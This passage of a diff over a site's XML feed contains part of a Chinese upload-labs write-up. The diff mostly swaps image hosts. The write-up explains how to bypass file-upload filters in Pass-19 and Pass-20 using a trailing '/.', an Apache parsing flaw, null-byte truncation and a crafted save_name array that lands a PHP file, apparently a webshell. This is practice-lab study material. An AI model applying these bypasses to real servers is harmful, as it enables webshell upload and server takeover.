class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>关于<code>pathinfo</code>函数如下：</p>
-<img src="http://img.kawhi.xyz/image-20200503232029310.png" style="high:60%;width:60%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503232029310.png" style="high:60%;width:60%;" />
 
 <p><strong>分析源码：</strong></p>
 <ul>
@@ -3737,14 +3739,14 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 </ul>
 <p><strong>绕过方法：</strong></p>
 <p><strong>/. 绕过</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503230732286.png" style="high:40%;width:40%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503230732286.png" style="high:40%;width:40%;" />
 
 <p><strong>apache解析漏洞</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503231026310.png" style="high:40%;width:40%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503231026310.png" style="high:40%;width:40%;" />
 
 <p>这个好像只能在低版本才能用，高一点的版本就会报错。</p>
 <p><strong>00截断绕过</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503231812592.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503231812592.png" style="high:80%;width:80%;" />
 
 <p>把+号的二进制改为00即可。</p>
 <h4 id="Pass-20-数组-绕过"><a href="#Pass-20-数组-绕过" class="headerlink" title="Pass-20(数组/.绕过)"></a><strong>Pass-20(数组/.绕过)</strong></h4><p>源代码：</p>
@@ -3756,13 +3758,13 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>所以这里传入的是字符串的话，后缀就必为<code>gif</code>、<code>png</code>、<code>jpg</code>，无法达到上传php的目的。因此这里<code>save_name</code>不能以字符串形式传入，而应该以数组形式传入，从而绕过explode函数，构建特殊数组。使得<code>end()</code>能绕过白名单，而<code>$file[count($file) - 1]</code>不等于<code>gif</code>、<code>png</code>、<code>jpg</code>。</p>
 <p>这里可以构造<code>save_name[0] = 1.php/</code>，<code>save_name[2] = jpg</code>,这样的话<code>end($file)</code>为<code>jpg</code>，而<code>$file[count($file) - 1]</code>为<code>$file[1]</code>为空。所以最终<code>file_name=1.php/.</code>，到这里就跟Pass-19一样了。</p>
 <p><strong>绕过方法：</strong></p>
-<img src="http://img.kawhi.xyz/image-20200504131400237.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200504131400237.png" style="high:80%;width:80%;" />
 
 <p>成功连接</p>
-<img src="http://img.kawhi.xyz/image-20200504131527424.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200504131527424.png" style="high:80%;width:80%;" />
 
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>这是一张网上找来的图</p>
-<img src="http://img.kawhi.xyz/upload-labs.png" style="high:100%;width:100%;" />]]></content>
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/upload-labs.png" style="high:100%;width:100%;" />]]></content>
       <categories>
         <category>刷题</category>
       </categories>
